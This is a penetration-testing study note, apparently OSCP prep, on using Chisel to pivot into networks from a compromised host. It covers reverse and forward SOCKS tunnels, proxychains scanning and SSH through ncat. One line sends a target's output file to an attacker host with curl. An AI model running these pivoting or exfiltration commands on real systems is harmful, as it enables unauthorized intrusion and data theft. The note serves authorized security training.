# Chisel

Fast TCP/UDP tunnel over HTTP, secured via SSH under the hood. A single binary that runs as either a server (on Kali) or a client (dropped on a compromised target), used for pivoting into a network segment that isn't otherwise reachable.

Cross-links: [[19. Port Redirection and SSH Tunneling|PT.5 Chisel]], [[Port Redirection and SSH Tunneling#Chisel SOCKS5 Forward Variant (HTTP-Tunneled Pivoting)|Command Appendix]]

---

## What it would replace, and why it's faster

The traditional manual approach to pivoting is SSH local/remote/dynamic port forwarding (`ssh -L`/`-R`/`-D`) chained with `proxychains`, which works but is fiddly to set up correctly (especially multiple hops) and requires SSH access specifically. Chisel works over plain HTTP (so it survives more restrictive firewalls that only allow outbound web traffic) and doesn't require SSH on the target at all, just the ability to drop and run a single static binary.

## Install

Ships in Kali's tools by default. If missing:
```bash
sudo apt install chisel
# or: go install github.com/jpillora/chisel@latest
```

## Usage

```bash
# On Kali (attacker), run the server
chisel server -p 8000 --reverse

# On the compromised target, run the client, connecting back to Kali and opening a reverse SOCKS proxy
./chisel client <kali_ip>:8000 R:socks

# SOCKS (Socket Secure) is a protocol that lets you route any TCP/UDP traffic through a proxy server;
# once Chisel opens a SOCKS listener, proxychains forwards your tools' connections through it
# Now route tools through the tunnel via proxychains, pointed at Chisel's local SOCKS listener (default 127.0.0.1:1080)
proxychains nmap -sT -Pn <internal_target>
```
*`--reverse` on the server side lets the target-side client initiate the connection outbound (works even when Kali can't reach the target directly, only the target can reach Kali), the more common real-world direction once you're behind a firewall. `R:socks` sets up a reverse dynamic SOCKS proxy specifically, other forwarding modes exist for single-port forwards instead of a full SOCKS proxy.*

---

## Forward Variant (pivot host as server)

The reverse variant (above) has Kali as the server. There's also a forward variant where the **pivot host runs the server** and Kali is the client connecting into it. Use this when Kali can reach the pivot host inbound but you want to avoid SSH entirely.

```bash
# On the pivot host (compromised Linux box acting as the jump point):
./chisel server -v -p 1234 --socks5

# On Kali (connecting to the pivot to open the SOCKS proxy):
chisel client -v <PIVOT_IP>:1234 socks
```

→ This opens SOCKS5 proxy on Kali's `127.0.0.1:1080`.
→ Update `/etc/proxychains4.conf`: `socks5 127.0.0.1 1080`
→ Then `proxychains nmap -sT -Pn -n <target>` as normal.

**Comparison:**

| | Reverse (Kali = server) | Forward (pivot = server) |
|---|---|---|
| Kali can reach pivot inbound? | Not needed | Yes, required |
| Pivot initiates outbound connection? | Yes | No |
| SOCKS type | SOCKS5 | SOCKS5 |
| proxychains port | 1080 | 1080 |
| Common when | Pivot behind firewall, can only call home | Pivot is openly accessible, no SSH needed |

See also [[Ligolo-ng]] for a TUN-interface-based alternative that skips `proxychains` entirely.

---

## SSH Through a Chisel SOCKS Proxy (ProxyCommand + Ncat)

`proxychains ssh` works but the cleanest approach is `ProxyCommand`. Kali's built-in `nc` doesn't support SOCKS; use **ncat** instead:

```bash
sudo apt install ncat

ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@<internal-host>
# %h = SSH destination host  %p = SSH destination port (filled in by SSH at runtime)
```

---

## glibc Incompatibility (Go 1.20+ vs Older Targets)

Kali packages Chisel compiled with Go 1.20+. Targets running older Ubuntu/Debian may not have glibc 2.32 or 2.34, causing:
```
/tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found
```

**Fix:** Download the official v1.8.1 release binary (compiled with Go 1.19):
```bash
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
gunzip chisel_1.8.1_linux_amd64.gz && chmod +x chisel_1.8.1
```

Use the blind error-collection pattern to detect this without direct shell access:
```bash
/tmp/chisel client <ip>:<port> R:socks &> /tmp/output; curl --data @/tmp/output http://<ip>:<port>/
```

**General rule:** Any Go binary compiled with 1.20+ fails on glibc < 2.32. Always check the target's glibc version (`ldd --version`) if you control it, or use the older compiled release.

Cross-link: [[20. Tunneling Through Deep Packet Inspection#20.1.2 HTTP Tunneling with Chisel|Tunneling Through Deep Packet Inspection#20.1.2 HTTP Tunneling with Chisel]]

#### Tags: #ModernTooling #Chisel #Pivoting #Tunneling #ProxyChains #ProxyCommand #Ncat #DPI #HTTPTunnel #Module20 #HTBSupplementary
## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

Chisel supports a repeatable task in an authorized assessment; knowing when to use it keeps the workflow deliberate rather than tool-led.

## Tool description

Chisel is a focused utility for the technique named by this page. Read its output as evidence and confirm important findings manually.

## Basic usage

Run the help screen first, then use the smallest command that answers the current question:

~~~bash
chisel --help
~~~

## Related RUNBOOK V2 stage

- [[RUNBOOK V2/Index]] -- route to the technique-specific stage after identifying the finding

## Related module

- [[MODULES/13. Locating Public Exploits]] -- understand the tool’s place in a controlled workflow

## Demonstrated in box write-ups

- [[OSCP/BOXES/WRITE UPS/Windows/Buff|Buff]] -- one-port reverse mapping from a Windows foothold to CloudMe on 127.0.0.1:8888
